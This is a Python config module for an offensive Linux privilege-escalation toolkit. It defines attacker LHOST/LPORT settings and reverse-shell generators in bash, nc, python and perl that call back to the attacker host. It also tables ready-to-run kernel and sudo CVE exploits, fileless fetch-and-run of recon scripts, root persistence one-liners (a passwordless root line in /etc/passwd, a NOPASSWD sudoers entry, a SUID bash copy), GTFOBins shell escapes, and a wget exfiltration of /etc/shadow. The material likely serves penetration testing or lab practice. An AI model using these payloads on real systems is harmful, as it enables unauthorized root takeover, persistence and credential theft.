"""Shared config + tables for the Linux privesc generators (the Potato-toolkit analog).

ONE definition per concept: edit LHOST / LPORT / WEBHOST here; every generator reads it.
Two buckets, mirroring the two Windows Potato archetypes:
  - EXPLOITS   = drop-and-run CVE PoCs      (the GodPotato/PrintSpoofer analog) -> gen_exploit.py
  - GTFOBINS   = SUID/sudo abuse primitives (the SeImpersonate-token analog)    -> gtfo.py
"""
import base64

# ================= EDIT THESE =================
LHOST, LPORT = "10.10.14.7", 443
WEBHOST = f"http://{LHOST}"          # where gen_exploit.py --fetch pulls the PoC from
STAGE   = "/tmp"                     # writable+EXEC staging dir. If /tmp is noexec (mount|grep noexec),
                                     #   set to /dev/shm, /var/tmp, or a discovered writable+exec dir —
                                     #   .so/.ko/compiled-PoC/SUID-copy all need EXEC here. --stagedir overrides.
REVTYPE = "bash"                     # bash | mkfifo | python | perl | nc   (target's shell/tools decide:
                                     #   bash needs /dev/tcp; mkfifo/nc need nc; python/perl need the interpreter)
# ==============================================

def revshell(revtype=None):
    """The reverse shell string for the chosen delivery. bash is the default; pick another when the
    target is dash/ash/busybox-only or lacks /dev/tcp. --revtype on the generators overrides."""
    rt = revtype or REVTYPE
    L, P = LHOST, LPORT
    return {
        "bash":   f"bash -c 'bash -i >& /dev/tcp/{L}/{P} 0>&1'",
        "mkfifo": f"rm -f {STAGE}/.f;mkfifo {STAGE}/.f;cat {STAGE}/.f|/bin/sh -i 2>&1|nc {L} {P} >{STAGE}/.f",
        "python": f'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("{L}",{P}));'
                  f'[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")\'',
        "perl":   f'perl -e \'use Socket;$i="{L}";$p={P};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                  f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");'
                  f'open(STDERR,">&S");exec("/bin/sh -i");}};\'',
        "nc":     f"nc {L} {P} -e /bin/sh   # if nc lacks -e: use --revtype mkfifo",
    }.get(rt, f"bash -c 'bash -i >& /dev/tcp/{L}/{P} 0>&1'")

# ---- what to do ONCE you are root (paste into a popped root shell, or fold into a cmd-type exploit) ----
def root_actions(revtype=None):
    return {
        "revshell":  revshell(revtype),
        "suid_bash": f"cp /bin/bash {STAGE}/.rb 2>/dev/null; chmod 4755 {STAGE}/.rb   # then: {STAGE}/.rb -p",
        "add_root":  "echo 'r::0:0:r:/root:/bin/bash' >> /etc/passwd            # then: su r  (no password)",
        "nopasswd":  "echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers # only if you're already the caller",
    }

def b64sh(snippet):                  # clean nesting: run a snippet with no quoting worries
    b = base64.b64encode(snippet.encode()).decode()
    return f"echo {b}|base64 -d|bash"

# ---- BUCKET 2: drop-and-run CVE exploits (version-match FIRST; wrong kernel exploit panics the box) ----
# kind: "shell" pops an interactive root shell (run a root_action from it) | "cmd" runs {POST} as root (foldable)
# {DIR}=staging dir, {DST}=staged source path, {POST}=chosen root action
EXPLOITS = {
    "gameoverlay": {
        "cve": "CVE-2023-2640/32629", "applies": "Ubuntu overlayfs (kernels ~5.4–5.17)",
        "kind": "cmd", "needs_gcc": False, "build": "",
        "run": ('unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/ && '
                'setcap cap_setuid+eip l/python3 && '
                'mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*" && '
                'u/python3 -c \'import os;os.setuid(0);os.system("{POST}")\''),
        "note": "PURE SHELL, no gcc — the truest 'Linux Potato'. Ubuntu-specific; tweak the python3 glob if needed.",
    },
    "pwnkit": {
        "cve": "CVE-2021-4034", "applies": "polkit pkexec <0.120 (2021-era, near-universal)",
        "kind": "shell", "needs_gcc": True, "build": "make -C {DIR}",
        "run": "{DIR}/cve-2021-4034",
        "note": "berdav/CVE-2021-4034: make -> ./cve-2021-4034 pops a root shell. Self-contained.",
    },
    "dirtypipe": {
        "cve": "CVE-2022-0847", "applies": "kernel 5.8–5.16.11 / 5.15.25 / 5.10.102",
        "kind": "shell", "needs_gcc": True, "build": "gcc {DST} -o {DIR}/dp",
        "run": "{DIR}/dp $(find / -perm -4000 -type f 2>/dev/null|head -n1)",
        "note": "Blasty dirtypipez.c hijacks a SUID binary -> root shell. Run a root_action from it.",
    },
    "baronsamedit": {
        "cve": "CVE-2021-3156", "applies": "sudo 1.8.2–1.8.31p2 / 1.9.0–1.9.5p1",
        "kind": "shell", "needs_gcc": True, "build": "make -C {DIR}",
        "run": "{DIR}/sudo-hax-me-a-sandwich 0",
        "note": "worawit PoC needs target-matched libc offsets; try the numbered targets. Finicky.",
    },
    "looneytunables": {
        "cve": "CVE-2023-4911", "applies": "glibc 2.34+ (Ubuntu 22.04/23.04, Fedora 37/38)",
        "kind": "shell", "needs_gcc": True, "build": "gcc {DST} -o {DIR}/lt",
        "run": "{DIR}/lt",
        "note": "GLIBC_TUNABLES overflow -> root shell.",
    },
    "dirtycow": {
        "cve": "CVE-2016-5195", "applies": "kernel <4.8 (legacy boxes)",
        "kind": "shell", "needs_gcc": True, "build": "gcc -pthread {DST} -o {DIR}/dc -lcrypt",
        "run": "{DIR}/dc",
        "note": "dirty.c adds root user 'firefart' (pw baked in source). su firefart. Can be unstable — snapshot first.",
    },
    "nftables": {
        "cve": "CVE-2024-1086", "applies": "kernel 5.14–6.6 (nf_tables UAF); needs unpriv user namespaces",
        "kind": "shell", "needs_gcc": True, "build": "make -C {DIR}",
        "run": "{DIR}/exploit",
        "note": ("Notselwyn/CVE-2024-1086: make -> ./exploit pops a root shell (~99% reliable). "
                 "REQUIRES CONFIG_USER_NS + kernel.unprivileged_userns_clone=1 "
                 "(check: sysctl kernel.unprivileged_userns_clone). Best modern all-rounder."),
    },
    "netfilter": {
        "cve": "CVE-2023-32233", "applies": "kernel <=6.3.1 (nf_tables anon-set UAF); needs unpriv user namespaces",
        "kind": "shell", "needs_gcc": True, "build": "gcc {DST} -o {DIR}/nf -lmnl -lnftnl",
        "run": "{DIR}/nf",
        "note": ("nf_tables anonymous-set use-after-free -> root shell. Build needs libmnl/libnftnl-dev — "
                 "if absent on target, compile STATIC on attacker and --b64 the BINARY. Also needs unpriv userns."),
    },
    "msqueue": {
        "cve": "CVE-2021-22555", "applies": "kernel 2.6.19–5.11 (netfilter x_tables); very wide range",
        "kind": "shell", "needs_gcc": True, "build": "gcc -m32 -static {DST} -o {DIR}/mq  # or without -m32 per PoC",
        "run": "{DIR}/mq",
        "note": ("Google's netfilter heap oob → root shell. One of the widest-applicable kernel LPEs "
                 "(spans ~15y of kernels). Needs unpriv userns on some builds. Reliable public PoC (theflow)."),
    },
    "sequoia": {
        "cve": "CVE-2021-33909", "applies": "kernel <5.13.4 (seq_file size_t underflow); Ubuntu/Debian/Fedora",
        "kind": "shell", "needs_gcc": True, "build": "make -C {DIR}",
        "run": "{DIR}/exploit",
        "note": ("filesystem-layer size_t underflow → root. Qualys PoC. Memory-hungry (needs ~GB); can be "
                 "unstable on small boxes — snapshot first."),
    },
    "stackrot": {
        "cve": "CVE-2023-3269", "applies": "kernel 6.1–6.4 (maple-tree UAF in the stack expansion)",
        "kind": "shell", "needs_gcc": True, "build": "make -C {DIR}",
        "run": "{DIR}/exploit",
        "note": ("newer maple-tree UAF → root. PoC is timing-sensitive; retry. Fills a gap the older CVEs miss "
                 "(6.1–6.4). Needs unpriv userns."),
    },
}

# ---- BUCKET 2-adjacent: recon helpers you stage the same way (not exploits — they FIND the vector) ----
# script -> can pipe fileless to sh; binary -> must land on disk (chmod +x, run). {URL}=WEBHOST, {DST}=staged path.
RECON = {
    "linpeas": {
        "kind": "script", "file": "linpeas.sh",
        "fetch_run": "wget -qO- {URL}/linpeas.sh 2>/dev/null|sh || curl -s {URL}/linpeas.sh|sh",  # fileless
        "disk_run": "chmod +x {DST} && {DST} -a",                                                  # -a = all checks
        "note": "the exhaustive enum sweep (winPEAS analog). Fileless pipe-to-sh leaves nothing on disk.",
    },
    "pspy": {
        "kind": "binary", "file": "pspy64",
        "fetch_run": "",                                     # a binary can't pipe to sh — must hit disk
        "disk_run": "chmod +x {DST} && {DST} -pf -i 1000",   # watch procs+files, 1s interval
        "note": "watch cron/processes as UNPRIV (no root) to catch root-run jobs + creds passed on the cmdline.",
    },
}

# ---- BUCKET 1: GTFOBins SUID/sudo abuse (already-on-box binaries) ----
# suid form keeps -p (don't drop the euid); sudo form runs as root already. Owner is usually root.
# THOROUGH inline set (air-gapped operators can't reach abuse.gtfobins.github.io — that's WHY it's inlined).
# "" for a form = not a clean primitive that way (e.g. socat can't keep euid on suid; use sudo/cap instead).
GTFOBINS = {
    # --- shells & find ---
    "bash":     {"suid": "./bash -p",                                    "sudo": "sudo bash"},
    "sh":       {"suid": "./sh -p",                                      "sudo": "sudo sh"},
    "dash":     {"suid": "./dash -p",                                    "sudo": "sudo dash"},
    "busybox":  {"suid": "./busybox sh   # (busybox sh honors the suid on many builds)",
                 "sudo": "sudo busybox sh"},
    "find":     {"suid": "find . -exec /bin/sh -p \\; -quit",            "sudo": "sudo find . -exec /bin/sh \\; -quit"},
    # --- interpreters ---
    "python":   {"suid": "python -c 'import os;os.setuid(0);os.system(\"/bin/sh -p\")'",
                 "sudo": "sudo python -c 'import os;os.system(\"/bin/sh\")'"},
    "perl":     {"suid": "perl -e 'use POSIX qw(setuid);POSIX::setuid(0);exec \"/bin/sh -p\";'",
                 "sudo": "sudo perl -e 'exec \"/bin/sh\";'"},
    "ruby":     {"suid": "ruby -e 'Process::Sys.setuid(0);exec \"/bin/sh -p\"'",
                 "sudo": "sudo ruby -e 'exec \"/bin/sh\"'"},
    "php":      {"suid": "php -r 'posix_setuid(0);pcntl_exec(\"/bin/sh\",[\"-p\"]);'",
                 "sudo": "sudo php -r 'system(\"/bin/sh\");'"},
    "node":     {"suid": "node -e 'process.setuid(0);require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'",
                 "sudo": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"},
    "lua":      {"suid": "",  # lua can't setuid without a C module; euid drops
                 "sudo": "sudo lua -e 'os.execute(\"/bin/sh\")'"},
    "awk":      {"suid": "awk 'BEGIN{system(\"/bin/sh -p\")}'",          "sudo": "sudo awk 'BEGIN{system(\"/bin/sh\")}'"},
    "gawk":     {"suid": "gawk 'BEGIN{system(\"/bin/sh -p\")}'",         "sudo": "sudo gawk 'BEGIN{system(\"/bin/sh\")}'"},
    "expect":   {"suid": "expect -c 'spawn /bin/sh -p;interact'",        "sudo": "sudo expect -c 'spawn /bin/sh;interact'"},
    # --- editors & pagers (pager escape = !/bin/sh) ---
    "vim":      {"suid": "vim -c ':py3 import os;os.setuid(0);os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset;exec sh -p\")'",
                 "sudo": "sudo vim -c ':!/bin/sh'"},
    "vi":       {"suid": "vi -c ':!/bin/sh -p' /dev/null",               "sudo": "sudo vi -c ':!/bin/sh' /dev/null"},
    "nano":     {"suid": "nano   # then ^R^X (Read-file>eXecute):  reset; sh -p 1>&0 2>&0",
                 "sudo": "sudo nano   # then ^R^X:  reset; sh 1>&0 2>&0"},
    "ed":       {"suid": "ed   # then: !/bin/sh -p",                     "sudo": "sudo ed   # then: !/bin/sh"},
    "emacs":    {"suid": "emacs -Q -nw --eval '(term \"/bin/sh -p\")'",  "sudo": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"},
    "less":     {"suid": "less /etc/profile   # then: !/bin/sh -p",      "sudo": "sudo less /etc/profile   # then: !/bin/sh"},
    "more":     {"suid": "more /etc/profile   # (small window) then: !/bin/sh -p", "sudo": "sudo more /etc/profile   # then: !/bin/sh"},
    "man":      {"suid": "man man   # then: !/bin/sh -p",                "sudo": "sudo man man   # then: !/bin/sh"},
    "git":      {"suid": "PAGER='sh -c \"exec sh -p 0<&1\"' git -p help",
                 "sudo": "sudo git -p help config   # then: !/bin/sh   (or -c core.pager=)"},
    "journalctl":{"suid": "journalctl   # forces the less pager, then: !/bin/sh -p",
                 "sudo": "sudo journalctl   # then: !/bin/sh   (resize the term small so it pages)"},
    # --- archivers ---
    "tar":      {"suid": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='/bin/sh -p'",
                 "sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
    "zip":      {"suid": "TF=$(mktemp -u);zip $TF /etc/hostname -T -TT 'sh -p #'",
                 "sudo": "TF=$(mktemp -u);sudo zip $TF /etc/hostname -T -TT 'sh #'"},
    # --- debuggers ---
    "gdb":      {"suid": "gdb -nx -ex 'python import os;os.setuid(0)' -ex '!sh -p' -ex quit",
                 "sudo": "sudo gdb -nx -ex '!sh' -ex quit"},
    # --- file read/write primitives (not a shell — forge /etc/passwd or read /etc/shadow) ---
    "sed":      {"suid": "sed -n '1e exec sh -p 1>&0' /etc/hosts",       "sudo": "sudo sed -n '1e exec sh 1>&0' /etc/hosts"},
    "cp":       {"suid": "# read/write any file: cp /etc/shadow /tmp/  |  overwrite /etc/passwd with a UID-0 line",
                 "sudo": "# sudo cp your crafted /etc/passwd or an authorized_keys into place"},
    "tee":      {"suid": "# echo 'r::0:0::/root:/bin/bash' | ./tee -a /etc/passwd   then: su r",
                 "sudo": "echo 'r::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd   # then: su r"},
    "dd":       {"suid": "# dd if=crafted_passwd of=/etc/passwd",
                 "sudo": "echo 'r::0:0::/root:/bin/bash' | sudo dd of=/etc/passwd oflag=append conv=notrunc"},
    "base64":   {"suid": "./base64 /etc/shadow | base64 -d   # READ any file",
                 "sudo": "sudo base64 /etc/shadow | base64 -d"},
    "curl":     {"suid": "",  "sudo": "sudo curl file:///etc/shadow   # read; or -o to write a root-owned file"},
    "wget":     {"suid": "",  "sudo": "sudo wget --post-file=/etc/shadow http://<LHOST>:8000/   # exfil to your listener (`nc -lvnp 8000`). NOTE: -i would treat the file as a URL LIST, it does NOT read it out."},
    # --- network / transfer (ProxyCommand & -e run a shell as root under sudo) ---
    "ssh":      {"suid": "",  "sudo": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"},
    "scp":      {"suid": "",  "sudo": "echo 'sh 0<&2 1>&2' >/tmp/x;chmod +x /tmp/x;sudo scp -S /tmp/x a:b"},
    "rsync":    {"suid": "",  "sudo": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"},
    "socat":    {"suid": "",  "sudo": "sudo socat stdin exec:/bin/sh"},
    "ftp":      {"suid": "ftp   # then: !/bin/sh -p",                    "sudo": "sudo ftp   # then: !/bin/sh"},
    "nmap":     {"suid": "echo 'os.execute(\"/bin/sh -p\")' >/tmp/x.nse; nmap --script=/tmp/x.nse",
                 "sudo": "sudo nmap --interactive   # (old) then: !sh   | else the --script trick"},
    # --- system / container / build ---
    "env":      {"suid": "env /bin/sh -p",                              "sudo": "sudo env /bin/sh"},
    "nsenter":  {"suid": "",  "sudo": "sudo nsenter /bin/sh   # runs as root (no -t = no namespace switch)"},
    "capsh":    {"suid": "",  "sudo": "sudo capsh --gid=0 --uid=0 --"},
    "make":     {"suid": "make -s --eval=$'x:\\n\\t-'\"/bin/sh -p\"",
                 "sudo": "sudo make -s --eval=$'x:\\n\\t-/bin/sh'"},
    "gcc":      {"suid": "",  "sudo": "sudo gcc -wrapper /bin/sh,-s ."},
    "systemctl":{"suid": "# write a unit ExecStart=/bin/sh -c '<cmd>' then start it (needs write to a unit path)",
                 "sudo": "sudo systemctl link /path/evil.service && sudo systemctl start evil   # ExecStart runs as root"},
    "docker":   {"suid": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh   # docker group == root",
                 "sudo": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
    "mount":    {"suid": "",  "sudo": "# sudo mount -o bind,nosuid... limited; better: mount a crafted fs / see nfs route"},
    # --- exec wrappers (anything that runs a program as-is → point it at a shell) ---
    "nice":     {"suid": "nice /bin/sh -p",     "sudo": "sudo nice /bin/sh"},
    "stdbuf":   {"suid": "stdbuf -i0 /bin/sh -p","sudo": "sudo stdbuf -i0 /bin/sh"},
    "timeout":  {"suid": "timeout 7d /bin/sh -p","sudo": "sudo timeout 7d /bin/sh"},
    "flock":    {"suid": "flock -u / /bin/sh -p","sudo": "sudo flock -u / /bin/sh"},
    "ionice":   {"suid": "ionice /bin/sh -p",   "sudo": "sudo ionice /bin/sh"},
    "taskset":  {"suid": "taskset 1 /bin/sh -p","sudo": "sudo taskset 1 /bin/sh"},
    "setarch":  {"suid": "setarch $(arch) /bin/sh -p", "sudo": "sudo setarch $(arch) /bin/sh"},
    "watch":    {"suid": "",  "sudo": "sudo watch -x sh -c 'reset;exec sh 1>&0 2>&0'"},
    "xargs":    {"suid": "xargs -a /dev/null sh -p",   "sudo": "sudo xargs -a /dev/null sh"},
}

# Capabilities (getcap -r /): the truest SeImpersonate-token analog on Linux.
# `getcap -r / 2>/dev/null` lists them; +ep on the FILE = effective on exec (no sudo needed).
CAP_ABUSE = {
    "cap_setuid":         "<bin> -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'   (python/perl/ruby w/ this cap → instant root)",
    "cap_setgid":         "<bin> -c 'import os;os.setgid(0);os.system(\"/bin/sh\")'   → group root; pair w/ a group-writable root path",
    "cap_dac_read_search":"read ANY file: gdb/python opens it. e.g. `cat /etc/shadow`→crack, or steal /root/.ssh/id_* → ssh root@localhost",
    "cap_dac_override":   "write ANY file: append 'r::0:0:r:/root:/bin/bash' to /etc/passwd → su r  (no pw), or drop a root authorized_keys",
    "cap_chown":          "chown any file: `chown $(id -u) /etc/shadow` (or /etc/passwd) → then edit it as yourself → root",
    "cap_fowner":         "bypass perm checks on owner ops: `chmod u+s /bin/bash` → /bin/bash -p (SUID root shell)",
    "cap_sys_ptrace":     "attach+inject into a root process: ptrace a root-owned PID, write shellcode → code exec as root (pair w/ cap_sys_admin or a root proc you can trace)",
    "cap_sys_module":     "insmod a kernel module = ring-0: build a tiny .ko whose init runs `call_usermodehelper` on a revshell → root (needs matching kernel headers). gen_misc.py kmod",
    "cap_sys_admin":      "near-root: mount an overlay/bind to expose a SUID or edit a root file; or mount a crafted fs. e.g. mount -o bind then plant SUID bash. The broadest cap — treat as root.",
    "cap_net_raw":        "sniff the wire (raw sockets): tcpdump-style capture of plaintext creds/tokens on the box; not direct root but harvests reusable secrets",
    "cap_mknod":          "create a device node: `mknod /tmp/d b <maj> <min>` for the root disk → read/write the raw block device → dump /etc/shadow or edit files offline",
    "cap_sys_rawio":      "raw I/O to /dev/mem, /dev/port, and disks → read/patch kernel memory or the raw disk directly → root",
}

# ---- sudo misconfigurations (sudo -l shows the allowed commands / preserved env) ----
# Not CVEs — configuration abuse. Each is a one-liner you paste once you know `sudo -l` output.
SUDO_TRICKS = {
    "env_keep_ld_preload": {
        "when": "sudo -l shows  env_keep+=LD_PRELOAD  (or LD_LIBRARY_PATH)",
        "how":  "build a .so whose constructor sets uid 0 + execs a shell, then run any allowed sudo cmd with LD_PRELOAD set",
        "cmd":  "sudo LD_PRELOAD=/tmp/pre.so <any-allowed-command>   # → the .so runs as root before the command",
        "note": "use gen_preload.py to build the .so (needs gcc on the target, or compile on attacker + ship).",
    },
    "sudoedit_cve_2023_22809": {
        "when": "sudo -l shows a sudoedit / 'sudo -e' rule AND sudo <= 1.9.12p1",
        "how":  "CVE-2023-22809: an EDITOR/SUDO_EDITOR value containing ' -- ' injects an extra file to edit AS ROOT",
        "cmd":  "EDITOR='vi -- /etc/passwd' sudoedit /the/allowed/file   # opens /etc/passwd as root → add a UID-0 line",
        "note": "no compile. Also targets /etc/sudoers (add 'youruser ALL=(ALL) NOPASSWD:ALL'). Interactive editor.",
    },
    "wildcard_or_relative": {
        "when": "sudo -l shows a command you can influence (wildcard arg, relative path, or a GTFOBins binary)",
        "how":  "check the binary in the GTFOBINS table 'sudo' form (inlined — no website needed) — many spawn a shell",
        "cmd":  "sudo <binary> <gtfo-shell-escape>   # e.g. sudo awk 'BEGIN{system(\"/bin/sh\")}'",
        "note": "PATH-relative rules → also try hijacking PATH (gen_misc.py pathhijack) if the rule isn't an absolute path.",
    },
    "runas_neg1_cve_2019_14287": {
        "when": "sudo -l shows a Runas spec that EXCLUDES root, e.g. (ALL, !root) /bin/bash  AND sudo < 1.8.28",
        "how":  "CVE-2019-14287: uid -1 (or 4294967295) wraps to 0, bypassing the !root exclusion → runs as root anyway",
        "cmd":  "sudo -u#-1 /bin/bash        # (or  sudo -u#4294967295 <allowed-cmd>)  → root",
        "note": "no compile. Only when the rule tries to allow 'anyone but root' — the classic mistaken hardening.",
    },
    "ld_library_path": {
        "when": "sudo -l shows  env_keep+=LD_LIBRARY_PATH",
        "how":  "point LD_LIBRARY_PATH at a dir holding a malicious .so named like a lib the allowed cmd loads",
        "cmd":  "sudo LD_LIBRARY_PATH=/tmp <allowed-cmd>   # your /tmp/lib<name>.so constructor runs as root",
        "note": "like LD_PRELOAD but you must name the .so after a real dependency (ldd the target cmd). gen_preload.py --mode ldlib.",
    },
}
